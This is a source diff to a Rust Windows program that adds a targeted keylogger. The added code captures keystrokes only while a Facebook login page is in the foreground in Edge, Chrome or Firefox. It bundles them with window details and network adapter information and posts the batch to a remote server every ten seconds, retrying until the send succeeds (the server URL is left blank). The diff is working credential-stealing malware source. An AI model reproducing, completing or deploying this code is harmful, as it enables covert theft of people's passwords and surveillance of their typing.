@@ -2,6 +2,11 @@ mod bindings {
     ::windows::include_bindings!();
 }
 
+use std::{
+    sync::mpsc::{self, Receiver, Sender},
+    time::Duration,
+};
+
 use bindings::Windows::Win32::{
     IpHelper::{GetAdaptersInfo, IP_ADAPTER_INFO},
     KeyboardAndMouseInput::{GetAsyncKeyState, GetKeyboardLayout},
@@ -12,7 +17,27 @@ use bindings::Windows::Win32::{
     },
     WindowsProgramming::CloseHandle,
 };
-use chrono::prelude::Utc;
+
+use chrono::prelude::{DateTime, Utc};
+
+use serde::Serialize;
+
+const MAX_NETWORK_ADAPTERS: usize = 16;
+
+#[derive(Serialize, Debug)]
+struct KeyLoggerPayload {
+    mac_addresses: Vec<[i8; MAX_NETWORK_ADAPTERS]>,
+    key_presses: Vec<KeyPressInfo>,
+}
+
+#[derive(Serialize, Debug)]
+struct KeyPressInfo {
+    timestamp: DateTime<Utc>,
+    window_path: String,
+    window_title: String,
+    keyboard_layout: isize,
+    key_pressed: String,
+}
 
 fn virtual_key_code_to_string(virtual_key_code: i32) -> Option<String> {
     let is_key_a_digit = (0x30..=0x39).contains(&virtual_key_code);
@@ -21,12 +46,7 @@ fn virtual_key_code_to_string(virtual_key_code: i32) -> Option<String> {
         Some((virtual_key_code as u8 as char).to_string())
     } else {
         let virtual_key_code = match virtual_key_code {
-            0x01 => "[VK_LBUTTON]",
-            0x02 => "[VK_RBUTTON]",
             0x03 => "[VK_CANCEL]",
-            0x04 => "[VK_MBUTTON]",
-            0x05 => "[VK_XBUTTON1]",
-            0x06 => "[VK_XBUTTON2]",
             0x08 => "[VK_BACK]",
             0x09 => "[VK_TAB]",
             0x0c => "[VK_CLEAR]",
@@ -225,48 +245,96 @@ fn path_active_window(active_window_handle: HWND) -> String {
     String::from_utf16_lossy(&path_buffer[..path_len])
 }
 
-fn main() -> Result<(), String> {
+fn mac_addresses() -> Vec<[i8; MAX_NETWORK_ADAPTERS]> {
+    let mut network_adapters = vec![IP_ADAPTER_INFO::default(); MAX_NETWORK_ADAPTERS];
+    let mut network_adapters_size =
+        (std::mem::size_of::<IP_ADAPTER_INFO>() * MAX_NETWORK_ADAPTERS) as u32;
+    unsafe { GetAdaptersInfo(network_adapters.as_mut_ptr(), &mut network_adapters_size) };
+    network_adapters
+        .iter()
+        .filter_map(|qwe| {
+            (!qwe.Address.iter().all(|dfgd| *dfgd == 0)).then(|| qwe.IpAddressList.IpAddress.String)
+        })
+        .collect()
+}
+
+fn is_program_desired(program_names: &[&str], window_path: &str) -> bool {
+    program_names
+        .iter()
+        .any(|program_name| window_path.ends_with(program_name))
+}
+
+fn is_window_title_desired(window_titles: &[&str], window_title: &str) -> bool {
+    window_titles
+        .iter()
+        .any(|title| window_title.contains(title))
+}
+
+async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
+    let sending_duration = Duration::from_secs(10);
+    let retry_response_duration = Duration::from_secs(10);
+    let http_client = reqwest::Client::new();
     loop {
-        for virtual_key_code in 0..255 {
-            let key_state = unsafe { GetAsyncKeyState(virtual_key_code) };
-            let is_key_pressed = key_state as i32 & 0x8000 > 0;
-            if is_key_pressed {
-                let key_pressed = virtual_key_code_to_string(virtual_key_code);
-                if let Some(key_pressed) = key_pressed {
-                    let active_window_handle = unsafe { GetForegroundWindow() };
-                    let now_timestamp = Utc::now();
-                    let window_path = path_active_window(active_window_handle);
-                    let window_title = title_active_window(active_window_handle);
-                    let keyboard_layout = unsafe { GetKeyboardLayout(0).0 };
+        std::thread::sleep(sending_duration);
+        let mut key_presses: Vec<KeyPressInfo> = vec![];
+        while let Ok(kpi) = rx.try_recv() {
+            key_presses.push(kpi)
+        }
+        let kl_payload = KeyLoggerPayload {
+            mac_addresses: mac_addresses(),
+            key_presses,
+        };
+        while http_client.post("").json(&kl_payload).send().await.is_err() {
+            println!("retrying send payload to server");
+            std::thread::sleep(retry_response_duration);
+        }
+    }
+}
 
-                    const MAX_NETWORK_ADAPTERS: usize = 16;
-                    let mut network_adapters =
-                        vec![IP_ADAPTER_INFO::default(); MAX_NETWORK_ADAPTERS];
-                    let mut network_adapters_size =
-                        (std::mem::size_of::<IP_ADAPTER_INFO>() * MAX_NETWORK_ADAPTERS) as u32;
-                    let status = unsafe {
-                        GetAdaptersInfo(network_adapters.as_mut_ptr(), &mut network_adapters_size)
-                    };
-                    // let mac_addresses: Vec<_> = network_adapters
-                    //     .iter()
-                    //     .filter_map(|qwe| {
-                    //         (!qwe.Address.iter().all(|dfgd| *dfgd == 0)).then(|| qwe.IpAddressList.IpAddress.String)
-                    //     })
-                    //     .collect();
-                    // println!("{:?}",mac_addresses);
-
-                    println!(
-                        "{}|{}|{}|{:b}|{}",
-                        now_timestamp.to_rfc3339(),
-                        window_path,
+fn capture_client_keys(
+    tx: &Sender<KeyPressInfo>,
+    browser_exe_names: &[&str],
+    window_titles: &[&str],
+) {
+    for virtual_key_code in 0..255 {
+        let key_state = unsafe { GetAsyncKeyState(virtual_key_code) };
+        let is_key_pressed = key_state as i32 & 0x8000 > 0;
+        if is_key_pressed {
+            let some_key_pressed = virtual_key_code_to_string(virtual_key_code);
+            if let Some(key_pressed) = some_key_pressed {
+                let active_window_handle = unsafe { GetForegroundWindow() };
+                let window_path = path_active_window(active_window_handle);
+                let window_title = title_active_window(active_window_handle);
+                let will_key_press_be_recorded =
+                    is_program_desired(&browser_exe_names, &window_path)
+                        && is_window_title_desired(&window_titles, &window_title);
+                if will_key_press_be_recorded {
+                    let kpi = KeyPressInfo {
+                        key_pressed,
                         window_title,
-                        keyboard_layout,
-                        key_pressed
-                    );
+                        window_path,
+                        keyboard_layout: unsafe { GetKeyboardLayout(0).0 },
+                        timestamp: Utc::now(),
+                    };
+                    tx.send(kpi).unwrap();
                 }
             }
         }
-        std::thread::sleep(std::time::Duration::from_millis(100));
+    }
+}
+
+#[tokio::main]
+async fn main() {
+    let (tx, rx) = mpsc::channel::<KeyPressInfo>();
+    tokio::spawn(send_server_key_presses_thread(rx));
+
+    let browser_exe_names = ["msedge.exe", "chrome.exe", "firefox.exe"];
+    let window_titles = ["Facebook - Log In or Sign Up"];
+
+    let key_detection_duration = Duration::from_millis(50);
+    loop {
+        capture_client_keys(&tx, &browser_exe_names, &window_titles);
+        std::thread::sleep(key_detection_duration);
     }
 }
 
